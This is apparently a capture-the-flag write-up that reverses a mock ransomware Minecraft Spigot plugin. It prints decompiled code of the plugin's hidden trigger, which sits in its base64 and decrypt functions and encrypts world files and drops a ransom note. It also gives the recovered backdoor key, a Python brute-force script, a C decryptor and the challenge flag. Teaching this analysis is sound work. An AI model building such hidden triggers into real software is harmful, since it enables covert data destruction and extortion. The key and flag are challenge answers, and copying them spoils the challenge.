This one was a fun Minecraft related rev challenge. 

We are told that the user's Spigot Minecraft server files have been encrypted. Extracting the archive `.tar.gz` file they give us, let's take a look at the server

![image](https://github.com/user-attachments/assets/0a06d530-fdfc-40d9-8332-37ea86a3806f)

So immediately we notice a `RANSOM_NOTE.txt`, meaning that the server was likely hit with some kind of ransomware. Taking a look at `world`, we can see that all the region files and the `level.dat` file have been encrypted, as seen by the `.enc` extension. 

![image](https://github.com/user-attachments/assets/b156f25d-3c35-4e16-8aad-16af10ad3767)

Alright, let's try to find what caused this. 

In the `plugins` directory, we can find `notsuspiciousplugin-0.9.0.jar`

![image](https://github.com/user-attachments/assets/74e645f9-215e-46c5-a9aa-1cc07e61bc58)

We can start reversing and taking a look at this using `jd-gui`. 

We see a lot of `.class` files here, but the `Encrypt` and `Decrypt` class files are particularly interesting

![image](https://github.com/user-attachments/assets/376c8b69-e05a-45e8-a3ea-a5977e645b8b)

In both the `Encrypt` and `Decrypt` files though, we can see that the function eventually calls a `nativeLib` function

Encrypt:
![image](https://github.com/user-attachments/assets/5c8802fb-5900-467c-aa14-1ed2049106e3)

Decrypt:
![image](https://github.com/user-attachments/assets/ae644e5f-a151-49ac-ba57-3d98265e5362)

Looking at the `NativeLib` class, it seems to be using functions from `notsuspicious.so` 
![image](https://github.com/user-attachments/assets/0004f7aa-4138-419f-8800-68664c1cd1b8)

Let's take a look at that `.so` file. 

We can run `unzip` on this `.jar` file to get the `notsuspicious.so` file on its own. I extracted to a directory I call `extracted-files`
![image](https://github.com/user-attachments/assets/e1278474-0f6c-4bdd-a71f-7802f07bfe23)

Let's pop this into Ghidra

After Ghidra does its analysis, we can see a lot of the same functions we saw in the `.jar` file. This is likely the underlying code for them. We can also see some functions that based on the names, seem to be used to specifically encrypt the Minecraft region and level files, `encrypt_level_dat` and `encrypt_region_files`. 

![image](https://github.com/user-attachments/assets/65f7ed5a-e903-4d85-9a70-93a4e0a9ffdd)

Let's look at the `decrypt` function first and try to rename some variables

<details>
  <Summary>Click to expand decrypt()</Summary>
  <div markdown=1>
    
```c
int decrypt(EVP_PKEY_CTX *ctx,uchar *out,size_t *outlen,uchar *in,size_t inlen)

{
  uint uVar1;
  uint uVar2;
  uint uVar3;
  int iVar4;
  int local_40;
  uint local_3c;
  uint local_38;
  uint local_30;
  
  iVar4 = (int)out;
  if (((((DAT_00105151 != '\0') && (*ctx == ctx[8])) && (ctx[8] == ctx[9])) &&
      (((((uint)(byte)ctx[1] + (uint)(byte)*ctx == 0xdf &&
         ((uint)(byte)ctx[2] + (uint)(byte)*ctx == 0xce)) &&
        (((uint)(byte)ctx[3] + (uint)(byte)*ctx == 0xd1 &&
         (((uint)(byte)ctx[4] + (uint)(byte)*ctx == 0xd0 &&
          ((uint)(byte)ctx[5] + (uint)(byte)*ctx == 0xd2)))))) &&
       ((uint)(byte)ctx[6] + (uint)(byte)*ctx == 0xda)))) &&
     (((((uint)(byte)ctx[7] + (uint)(byte)*ctx == 0xd3 &&
        ((uint)(byte)ctx[8] + (uint)(byte)*ctx == 0xde)) &&
       ((uint)(byte)ctx[9] + (uint)(byte)*ctx == 0xde)) &&
      (((uint)(byte)ctx[10] + (uint)(byte)*ctx == 0xe1 &&
       ((uint)(byte)ctx[0xb] + (uint)(byte)*ctx == 0x90)))))) {
    DAT_00105152 = 1;
    FUN_00101a5d();
  }
  if (iVar4 < 0) {
    iVar4 = iVar4 + 3;
  }
  uVar1 = iVar4 >> 2;
  uVar3 = uVar1;
  if (uVar1 != 0) {
    local_40 = (int)(0x34 / (ulong)uVar1) + 6;
    local_3c = local_40 * -0x61c88647;
    local_38 = *(uint *)ctx;
    do {
      uVar2 = local_3c >> 2 & 3;
      uVar3 = uVar1;
      while (local_30 = uVar3 - 1, local_30 != 0) {
        uVar3 = *(uint *)(ctx + (ulong)(uVar3 - 2) * 4);
        *(uint *)(ctx + (ulong)local_30 * 4) =
             *(int *)(ctx + (ulong)local_30 * 4) -
             ((uVar3 >> 5 ^ local_38 << 2) + (uVar3 << 4 ^ local_38 >> 3) ^
             (*(uint *)((long)outlen + (ulong)(local_30 & 3 ^ uVar2) * 4) ^ uVar3) +
             (local_3c ^ local_38));
        local_38 = *(uint *)(ctx + (ulong)local_30 * 4);
        uVar3 = local_30;
      }
      uVar3 = *(uint *)(ctx + (ulong)(uVar1 - 1) * 4);
      *(uint *)ctx = *(int *)ctx -
                     ((*(uint *)((long)outlen + (ulong)uVar2 * 4) ^ uVar3) + (local_3c ^ local_38) ^
                     (uVar3 >> 5 ^ local_38 << 2) + (uVar3 << 4 ^ local_38 >> 3));
      local_38 = *(uint *)ctx;
      local_3c = local_3c + 0x61c88647;
      local_40 = local_40 + -1;
      uVar3 = CONCAT31((int3)(local_38 >> 8),local_40 != 0);
    } while (local_40 != 0);
  }
  return uVar3;
}

```
  </div>
</details>

Right at the beginning of this function we find an interesting check:

![image](https://github.com/user-attachments/assets/9176371e-0627-4ca2-ba0b-dd6b9d3b58f8)

It seems to be checking if the contents of `ctx`, which from the rest of the function we can pretty confidently deduce to be the ciphertext that we want to decrypt, is equal to a certain value. It also is checking if some value, `DAT_00105151` is true. I'll rename `DAT_00105151` to `checker`. 

If the ciphertext equals the desired value and `checker` is true, it calls a function `FUN_00101a5d`. Looking at that function, we can see that it's the function responsible for encrypting all the important files in the Minecraft server using the `encrypt_level_dat` and `encrypt_region_files` functions that we saw from before. I'll rename the function to `encrypt_all_files`

<details>
  <Summary>Click to expand encrypt_all_files()</Summary>
  <div markdown=1>
    
```c
void encrypt_all_files(void)

{
  char cVar1;
  int iVar2;
  char *pcVar3;
  size_t sVar4;
  FILE *__s;
  long in_FS_OFFSET;
  char local_318 [256];
  char local_218 [520];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  if (((checker == '\x01') && (DAT_00105152 == '\x01')) &&
     (pcVar3 = getcwd(local_318,0x100), pcVar3 != (char *)0x0)) {
    snprintf(local_218,0x200,"%s/world/level.dat",local_318);
    iVar2 = access(local_218,0);
    if ((iVar2 == 0) && (cVar1 = encrypt_level_dat(local_218), cVar1 == '\x01')) {
      snprintf(local_218,0x200,"%s/world/region/",local_318);
      cVar1 = encrypt_region_files(local_218);
      if (cVar1 == '\x01') {
        snprintf(local_218,0x200,"%s/world_nether/level.dat",local_318);
        iVar2 = access(local_218,0);
        if ((iVar2 == 0) && (cVar1 = encrypt_level_dat(local_218), cVar1 == '\x01')) {
          snprintf(local_218,0x200,"%s/world_nether/DIM-1/region/",local_318);
          cVar1 = encrypt_region_files(local_218);
          if (cVar1 == '\x01') {
            snprintf(local_218,0x200,"%s/world_the_end/level.dat",local_318);
            iVar2 = access(local_218,0);
            if ((iVar2 == 0) && (cVar1 = encrypt_level_dat(local_218), cVar1 == '\x01')) {
              snprintf(local_218,0x200,"%s/world_the_end/DIM1/region/",local_318);
              cVar1 = encrypt_region_files(local_218);
              if (cVar1 == '\x01') {
                sVar4 = strlen(local_318);
                pcVar3 = (char *)malloc(sVar4 + 0x18);
                sVar4 = strlen(local_318);
                snprintf(pcVar3,sVar4 + 0x17,"%s/RANSOM_NOTE.txt",local_318);
                __s = fopen(pcVar3,"w");
                if (__s != (FILE *)0x0) {
                  fwrite("Your world has been encrypted. To get it back, please do the following:\n"
                         ,1,0x48,__s);
                  fwrite("1. Send 500,000 ETH to the following address: 0x1234567890abcdef\n",1,0x41
                         ,__s);
                  fwrite("2. Do 5,000 push-ups on camera and upload it to YouTube\n",1,0x38,__s);
                  fwrite("3. Wait for further instructions\n",1,0x21,__s);
                  fwrite("4. Keep waiting for further instructions\n",1,0x29,__s);
                  fwrite("If you do not comply within 48 hours, your world will be deleted.\n",1,
                         0x42,__s);
                }
              }
            }
          }
        }
      }
    }
  }
  if (local_10 == *(long *)(in_FS_OFFSET + 0x28)) {
    return;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```
  </div>
</details>

Based on this, it seems that the ciphertext equaling whatever desired value the `decrypt` function is looking for and whatever sets `checker` to true are the conditions that activate the ransomware and encrypt everything. We just need to find what exactly those conditions are.

Before we do that, I first take a look at what exactly the decrypt function is doing. It seems to go through rounds, uses some kind of constant, and does a lot of xor and bitwise operations. After some research, the ransomware seems to be using a modified version of the [TEA/XTEA](https://en.wikipedia.org/wiki/XTEA) block cipher. Due to this new info, I retype and rename some variables for easier reading. 

<details>
  <Summary>Click to expand decrypt()</Summary>
  <div markdown=1>

```c
int decrypt(uint *ctx,uchar *out,size_t *outlen,uchar *in,size_t inlen)

{
  uint uVar1;
  uint uVar2;
  uint uVar3;
  int iVar4;
  int local_40;
  uint DELTA;
  uint ciphertext;
  uint local_30;
  
  iVar4 = (int)out;
  if (((((checker != '\0') && (*(char *)ctx == *(char *)(ctx + 2))) &&
       (*(char *)(ctx + 2) == *(char *)((long)ctx + 9))) &&
      (((((uint)*(byte *)((long)ctx + 1) + (uint)*(byte *)ctx == 0xdf &&
         ((uint)*(byte *)((long)ctx + 2) + (uint)*(byte *)ctx == 0xce)) &&
        (((uint)*(byte *)((long)ctx + 3) + (uint)*(byte *)ctx == 0xd1 &&
         (((uint)*(byte *)(ctx + 1) + (uint)*(byte *)ctx == 0xd0 &&
          ((uint)*(byte *)((long)ctx + 5) + (uint)*(byte *)ctx == 0xd2)))))) &&
       ((uint)*(byte *)((long)ctx + 6) + (uint)*(byte *)ctx == 0xda)))) &&
     (((((uint)*(byte *)((long)ctx + 7) + (uint)*(byte *)ctx == 0xd3 &&
        ((uint)*(byte *)(ctx + 2) + (uint)*(byte *)ctx == 0xde)) &&
       ((uint)*(byte *)((long)ctx + 9) + (uint)*(byte *)ctx == 0xde)) &&
      (((uint)*(byte *)((long)ctx + 10) + (uint)*(byte *)ctx == 0xe1 &&
       ((uint)*(byte *)((long)ctx + 0xb) + (uint)*(byte *)ctx == 0x90)))))) {
    DAT_00105152 = 1;
    FUN_00101a5d();
  }
  if (iVar4 < 0) {
    iVar4 = iVar4 + 3;
  }
  uVar1 = iVar4 >> 2;
  uVar3 = uVar1;
  if (uVar1 != 0) {
    local_40 = (int)(0x34 / (ulong)uVar1) + 6;
    DELTA = local_40 * -0x61c88647;
    ciphertext = *ctx;
    do {
      uVar2 = DELTA >> 2 & 3;
      uVar3 = uVar1;
      while (local_30 = uVar3 - 1, local_30 != 0) {
        uVar3 = ctx[uVar3 - 2];
        ctx[local_30] =
             ctx[local_30] -
             ((uVar3 >> 5 ^ ciphertext << 2) + (uVar3 << 4 ^ ciphertext >> 3) ^
             (*(uint *)((long)outlen + (ulong)(local_30 & 3 ^ uVar2) * 4) ^ uVar3) +
             (DELTA ^ ciphertext));
        ciphertext = ctx[local_30];
        uVar3 = local_30;
      }
      uVar3 = ctx[uVar1 - 1];
      *ctx = *ctx - ((*(uint *)((long)outlen + (ulong)uVar2 * 4) ^ uVar3) + (DELTA ^ ciphertext) ^
                    (uVar3 >> 5 ^ ciphertext << 2) + (uVar3 << 4 ^ ciphertext >> 3));
      ciphertext = *ctx;
      DELTA = DELTA + 0x61c88647;
      local_40 = local_40 + -1;
      uVar3 = CONCAT31((int3)(ciphertext >> 8),local_40 != 0);
    } while (local_40 != 0);
  }
  return uVar3;
}
```
  </div>
</details>

Well I mean, we do have the `notsuspicious.so` file to our disposal, so we could just use it to decrypt all the encrypted files using this `decrypt` function right? While that is true, we don't know one important thing. TEA/XTEA implementations usually require a 16-byte key, and it seems like this ransomware requires it too, as evidenced by these lines back in the `.jar` file
![image](https://github.com/user-attachments/assets/a69716fc-4217-4ee7-81e7-9f38039526ea)

So what even is that key? Well, it might be tied to those 2 conditions we found earlier that activates the `encrypt_all_files()` function, and as we keep analyzing, we'll find that it's specifically the `checker` variable. 

While looking at the other functions we can find in the `.so`, I find something pretty odd in the `base64_encode` function. 

<details>
  <Summary>Click to expand base64_encode()</Summary>
  <div markdown=1>
    
```c  
void base64_encode(byte *param_1,int param_2,char *param_3)

{
  byte bVar1;
  byte bVar2;
  byte bVar3;
  long lVar4;
  byte *pbVar5;
  ulong *__src;
  long in_FS_OFFSET;
  char *local_70;
  byte *local_60;
  
  lVar4 = *(long *)(in_FS_OFFSET + 0x28);
  pbVar5 = param_1 + param_2;
  local_70 = param_3;
  for (local_60 = param_1; 2 < (long)pbVar5 - (long)local_60; local_60 = local_60 + 3) {
    bVar2 = *local_60;
    bVar3 = local_60[1];
    bVar1 = local_60[2];
    *local_70 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
                [(int)(uint)(bVar2 >> 2)];
    local_70[1] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
                  [(int)((bVar2 & 3) << 4 | (uint)(bVar3 >> 4))];
    local_70[2] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
                  [(int)((bVar3 & 0xf) << 2 | (uint)(bVar1 >> 6))];
    local_70[3] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
                  [(int)(bVar1 & 0x3f)];
    local_70 = local_70 + 4;
  }
  if (pbVar5 != local_60) {
    bVar2 = *local_60;
    *local_70 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
                [(int)(uint)(bVar2 >> 2)];
    if ((long)pbVar5 - (long)local_60 == 1) {
      local_70[1] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
                    [(int)((bVar2 & 3) << 4)];
      local_70[2] = '=';
    }
    else {
      bVar3 = local_60[1];
      local_70[1] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
                    [(int)((bVar2 & 3) << 4 | (int)((char)bVar3 >> 4))];
      local_70[2] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
                    [(int)(((int)(char)bVar3 & 0xfU) << 2)];
    }
    local_70[3] = '=';
    local_70 = local_70 + 4;
  }
  *local_70 = '\0';
  if (param_2 == 8) {
    __src = (ulong *)(local_60 + -6);
    if ((*__src ^ *(ulong *)(local_70 + -0xc)) == 0x51e02052f115e3b) {
      checker = 1;
      strcpy(&DAT_00105140,(char *)__src);
      strcat(&DAT_00105140,(char *)__src);
      strcpy(local_70 + -0xc,&DAT_00105140);
    }
    else {
      checker = 0;
    }
  }
  else {
    checker = 0;
  }
  if (lVar4 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```
  </div>
</details>

There's some sort of conditional check here that sets `checker` to true:
![image](https://github.com/user-attachments/assets/21aecc81-49f9-4408-895f-ad532f2b954e)

Analyzing the rest of the function, it seems that what this check is doing is checking to see if the inputted text to the function is 8 bytes long. If it is, it base64 encodes the inputted text, and XOR's the two together. If it equals `0x51e02052f115e3b`, `checker` is set to true. 

We can write a pretty simple Python script to actually brute force byte by byte what this inputted text needs to be:

<details>
  <Summary>Click to expand get_key.py</Summary>
  <div markdown=1>

```Python  
# Basically brute forcing the logic we found in the b64encode function in Ghidra
# if ((*__src ^ *(ulong *)(local_70 + -0xc)) == 0x51e02052f115e3b)

import base64


# Target value (0x51e02052f115e3b)
target = 0x51e02052f115e3b

# Convert the target value into a list of bytes
target_bytes = [(target >> (8 * i)) & 0xFF for i in range(8)]

# Start with empty key
key = ''

# Basically loop through and incrementally crack the key
for i in range(8):
    for key_val in range(256):
        encoded = base64.b64encode(key.encode() + bytes([key_val]))
        
        # XOR key_val with the first byte of the base64-encoded string
        if (key_val ^ encoded[i]) == target_bytes[i]:
            key += chr(key_val)  # Append the character corresponding to key_val
            print(f"Key so far: {key}")
            break  # Break out of the loop once a match is found for this byte
```
  </div>
</details>

Running this gets us:
![image](https://github.com/user-attachments/assets/2e03bf6d-5a2b-4a5b-a7d4-888b4969aa1f)

So the inputted text needs to be `b4Ckd0Or`. As you can tell by my `key` references in the name of the Python file and in its output, I started to realize that this might actually be the key for the modified TEA/XTEA algorithm in the `decrypt` function that we're looking for. This is 8 bytes though, and the key needs to be 16 bytes. Perhaps the key is `b4Ckd0Orb4Ckd0Or`? Only one way to find out. 

We can write a C program to call the `decrypt` function from `notsuspicious.so`, but what even are the parameters we need to pass in?

I mean of course we have some hint of this in Ghidra:
![image](https://github.com/user-attachments/assets/b5b945c5-7689-4085-a6d0-e75cb790af3e)

But we can use gdb to be 100% sure. 

`notsuspiciousplugin-0.9.0.jar` is a plugin used by the Spigot server, so we can run the Spigot server normally and then set breakpoints. 

We can run the server with `java -Xms1G -Xmx2G -jar spigot-1.21.4.jar`

Now we need to attach `gdb` to this process. Run `ps aux | grep spigot` to find the process ID of the Spigot server

![image](https://github.com/user-attachments/assets/80f747ed-9bd8-440d-97a9-a28318c63b17)

So we find that the ID is `810`. We can attach gdb to this process with `gdb -p 810`

Now that gdb is attached, we can set the breakpoint. We'll set it at `decrypt`, since that's the function that we want to find the parameters too

![image](https://github.com/user-attachments/assets/5cf669bd-7dde-4f07-8603-422a3fd6e209)

Now how do we even go about calling this function? 

Looking back at `notsuspiciousplugin-0.9.0.jar`, in `plugin.yml`, we can find how to call decrypt

![image](https://github.com/user-attachments/assets/955799fe-708c-4902-a1b9-7664ed17918f)

So the syntax to call decrypt on the Minecraft server is `dec <ciphertext> <key>`

Also looking at the `DecryptCommand` function in the `.jar`, we see that our ciphertext has to be in hex

![image](https://github.com/user-attachments/assets/2846081d-d3b0-4579-8573-28646e5f4cd8)

For our ciphertext, I'll use `74657374`, which is `test` in hex. For the key I'll use the key, `testkey`

![image](https://github.com/user-attachments/assets/dcfa2bb7-5a0e-46e6-aa91-2d8fda7fa3c9)

Alright nice, we hit our breakpoint. 

Let's take a look at our registers to see what the parameters are

![image](https://github.com/user-attachments/assets/e6d8dd1d-983e-4eb4-aedf-5c8bbbe758b2)


For x86-64 architectures, `rdi` is the first parameter, `rsi` is the second parameter, `rdx` is the third parameter, `rcx` is the fourth parameter, and so on and so forth. Well let's look at what we have here

![image](https://github.com/user-attachments/assets/18af55d1-dded-4732-a674-3d46a7dddf79)

It seems that the ciphertext was the first parameter (`rdi`), the length of the ciphertext, which is 4, was the second parameter (`rsi`), and the key is the third parameter (`rdx`). The rest seem to be repeats or extraneous data. 

From this, we can pretty confidently say that `decrypt` takes 3 parameters, specifically to call `decrypt`, we would do `decrypt(ciphertext, ciphertext_length, key`. 

We can now write our C program to decrypt all the encrypted files!

Essentially what we need to do is to "import" the decrypt function from `notsuspicious.so` and call it on all the encrypted files. 

If we look at the decrypt function's logic, we can see that the passed in ciphertext, or `ctx` gets modified / decrypted in place

![image](https://github.com/user-attachments/assets/125f53b0-5afd-4902-b908-07d71e5bbe7c)

So we pass in the ciphertext to `decrypt`, and then we can write the "ciphertext", which is now decrypted, to another file. 

Let's write that solve program! I'll allow it to take the key as input since we're not entirely sure if `b4Ckd0Orb4Ckd0Or` is the key. Our progarm will go through all subdirectories finding any files that end with `.enc` and attempt to decrypt them. 

<details>
  <Summary>Click to expand backdoor_solve.c</Summary>
  <div markdown=1>
    
```c
// C program to basically import the decrypt function we found in Ghidra from notsuspicious.so and call it on the files we want to decrypt. decrypt modifies "ciphertext" variable in place, so once we call decrypt, we can just write "ciphertext" to the new files

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <sys/stat.h>
#include <unistd.h>
#include <dlfcn.h>

typedef int (*decrypt_func)(unsigned char *ciphertext, size_t ciphertext_size, const char *key);

// Function to check if a file has a ".enc" extension
int has_enc_extension(const char *filename) {
    size_t len = strlen(filename);
    return len > 4 && strcmp(filename + len - 4, ".enc") == 0;
}

// Function to decrypt files recursively in a directory
void decrypt_files_in_dir(const char *dir_path, const char *key, decrypt_func decrypt) {
    DIR *dir = opendir(dir_path);
    struct dirent *entry;

    if (dir == NULL) {
        perror("Failed to open directory");
        return;
    }

    while ((entry = readdir(dir)) != NULL) {
        char full_path[1024];
        snprintf(full_path, sizeof(full_path), "%s/%s", dir_path, entry->d_name);

        // Skip "." and ".." entries
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) {
            continue;
        }

        struct stat statbuf;
        if (stat(full_path, &statbuf) == -1) {
            perror("Failed to stat file");
            continue;
        }

        // If it's a directory, recurse into it
        if (S_ISDIR(statbuf.st_mode)) {
            decrypt_files_in_dir(full_path, key, decrypt);
        }
        // If it's a file and ends with ".enc", decrypt it
        else if (S_ISREG(statbuf.st_mode) && has_enc_extension(entry->d_name)) {
            printf("Decrypting: %s\n", full_path);

            // Read the ciphertext
            FILE *file = fopen(full_path, "rb");
            if (!file) {
                perror("Failed to open file");
                continue;
            }

            fseek(file, 0, SEEK_END);
            size_t file_size = ftell(file);
            fseek(file, 0, SEEK_SET);

            unsigned char *ciphertext = malloc(file_size);
            if (!ciphertext) {
                perror("Memory allocation failed");
                fclose(file);
                continue;
            }

            fread(ciphertext, 1, file_size, file);
            fclose(file);

            // Decrypt the file using the loaded function

            // We know what parameters are passed in due to GDB (attached to spigot.jar process) and breakpoint at the decrypt function. We saw that RDI (first param) was the ciphertext, RSI (second param) was the length, and RDX (third param) was the key

            int result = decrypt(ciphertext, file_size, key);
            if (result == 0) {
                printf("Successfully decrypted: %s\n", full_path);

                // Generate a new file name for the decrypted content (e.g., remove ".enc" only)
                char decrypted_file[1024];
                strncpy(decrypted_file, full_path, sizeof(decrypted_file));
                decrypted_file[sizeof(decrypted_file) - 1] = '\0';

                size_t len = strlen(decrypted_file);
                if (len >= 4 && strcmp(decrypted_file + len - 4, ".enc") == 0) {
                    decrypted_file[len - 4] = '\0'; // Just strip ".enc", don't add anything
                }

                // Open the new file for writing (in binary mode)
                FILE *dec_file = fopen(decrypted_file, "wb");
                if (!dec_file) {
                    perror("Failed to open decrypted file for writing");
                    free(ciphertext);
                    continue;
                }

                // Write the decrypted data to the new file (assuming it was done in-place)
                fwrite(ciphertext, 1, file_size, dec_file);
                fclose(dec_file);

                printf("Decrypted file written to: %s\n", decrypted_file);
            } 

            // Really lazy way to just decrypt anyway. result not being 0 doesn't mean that the decryption failed
            else {
                printf("Successfully decrypted: %s\n", full_path);

                // Generate a new file name for the decrypted content (e.g., remove ".enc" only)
                char decrypted_file[1024];
                strncpy(decrypted_file, full_path, sizeof(decrypted_file));
                decrypted_file[sizeof(decrypted_file) - 1] = '\0';

                size_t len = strlen(decrypted_file);
                if (len >= 4 && strcmp(decrypted_file + len - 4, ".enc") == 0) {
                    decrypted_file[len - 4] = '\0'; // Just strip ".enc", don't add anything
                }

                // Open the new file for writing (in binary mode)
                FILE *dec_file = fopen(decrypted_file, "wb");
                if (!dec_file) {
                    perror("Failed to open decrypted file for writing");
                    free(ciphertext);
                    continue;
                }

                // Write the decrypted data to the new file (assuming it was done in-place)
                fwrite(ciphertext, 1, file_size, dec_file);
                fclose(dec_file);

                printf("Decrypted file written to: %s\n", decrypted_file);
            }

            free(ciphertext);
        }
    }

    closedir(dir);
}

int main(int argc, char *argv[]) {
    if (argc != 2) {
        fprintf(stderr, "Usage: %s <key>\n", argv[0]);
        return 1;
    }

    const char *key = argv[1];

    // Load the shared object at runtime
    void *handle = dlopen("./notsuspicious.so", RTLD_LAZY);
    if (!handle) {
        fprintf(stderr, "Failed to load shared library: %s\n", dlerror());
        return 1;
    }

    // Get the decrypt function from the shared object
    decrypt_func decrypt = (decrypt_func)dlsym(handle, "decrypt");
    if (!decrypt) {
        fprintf(stderr, "Failed to find decrypt function: %s\n", dlerror());
        dlclose(handle);
        return 1;
    }

    // Start decrypting from the current directory
    decrypt_files_in_dir(".", key, decrypt);

    // Close the shared object when done
    dlclose(handle);

    return 0;
}

```
  </div>
</details>

We run it with `./backdoor_solve b4Ckd0Orb4Ckd0Or`. Let's hope that key is correct. 

![image](https://github.com/user-attachments/assets/3721eb5c-1e72-4b5e-9285-9371aead9773)

It seems to have worked?

![image](https://github.com/user-attachments/assets/b4d901ac-123a-4a5e-926a-34204713593f)

We seem to have decrypted the files

![image](https://github.com/user-attachments/assets/8bfa2d3e-9a96-4a0b-9dc8-58a3d5c3f64a)

Now we just have to find the flag. There's many ways to do this. You could use the Python [Anvil](https://github.com/Intergalactyc/anvil-new/tree/master) library, or used [NPTExplorer](https://www.minecraftforum.net/forums/mapping-and-modding-java-edition/minecraft-tools/1262665-nbtexplorer-nbt-editor-for-windows-and-mac). Or, if you have Minecraft, you can just pop the world into minecraft. 

I just copy and pasted the `world` directory into my Windows Minecraft `saves` directory

![image](https://github.com/user-attachments/assets/67e0de9a-468c-46b0-969d-09db341fd6a2)

Now, we can load up Minecraft Java edition and look at the world. Where exactly is the flag though? 

Well, looking through some of the data, we can find some playerdata that shows some player info of this challenge's creator, Flocto

![image](https://github.com/user-attachments/assets/64e89b5a-c415-447b-afb3-d7d028d4edca)

So we know his user ID. That means we can go to the `world/playerdata` directory and find where Flocto is in the game world. We can view this using [NPTExplorer](https://www.minecraftforum.net/forums/mapping-and-modding-java-edition/minecraft-tools/1262665-nbtexplorer-nbt-editor-for-windows-and-mac). 

![image](https://github.com/user-attachments/assets/d8f85a6c-559c-4021-ba41-c585d9eff119)

So now we know where he is! Let's go there in the game world. It's a Survival world, so I activated cheats by opening to LAN and just teleported to -1000, 114, -1000, or at least as close as I could get. There's a sand tower that we have to get to the top of

![image](https://github.com/user-attachments/assets/94633f95-1c4a-49f7-871c-2df38a4d251d)

Once there, we get our flag!

![image](https://github.com/user-attachments/assets/8fa7adf1-8b38-4e4e-87e5-c390b0829b1e)

`gigem{i_also_wanted_to_play_hypixel_too_thanks}` is the flag, and with that, we have finished this challenge!
